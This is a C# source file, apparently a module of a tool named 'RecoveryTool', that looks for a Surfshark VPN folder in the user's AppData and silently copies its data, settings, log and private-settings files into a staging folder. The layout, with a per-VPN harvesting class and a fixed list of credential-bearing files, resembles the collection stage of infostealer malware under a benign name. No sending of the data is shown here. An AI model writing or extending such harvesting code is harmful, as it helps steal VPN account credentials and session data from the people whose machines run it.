using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.VPNs
{
    public class SharkVPNService
    {
        private static readonly string[] FilesToCopy = ["data.dat", "settings.dat", "settings-log.dat", "private_settings.dat"];

        public static async Task SaveSharkVPNAsync()
        {
            string surfsharkVpnFolder = Path.Combine(Common.AppData, "Surfshark");
            if (!Directory.Exists(surfsharkVpnFolder)) return;

            string destinationFolder = Common.EnsureSharkVPNPath();

            foreach (string file in FilesToCopy)
            {
                string sourceFile = Path.Combine(surfsharkVpnFolder, file);
                string destinationFile = Path.Combine(destinationFolder, file);

                if (File.Exists(sourceFile))
                {
                    await CopyFileAsync(sourceFile, destinationFile);
                }
            }
        }

        private static async Task CopyFileAsync(string sourceFile, string destinationFile)
        {
            using FileStream sourceStream = new(sourceFile, FileMode.Open, FileAccess.Read, FileShare.Read, 4096, true);
            using FileStream destinationStream = new(destinationFile, FileMode.Create, FileAccess.Write, FileShare.None, 4096, true);
            await sourceStream.CopyToAsync(destinationStream);
        }
    }
}
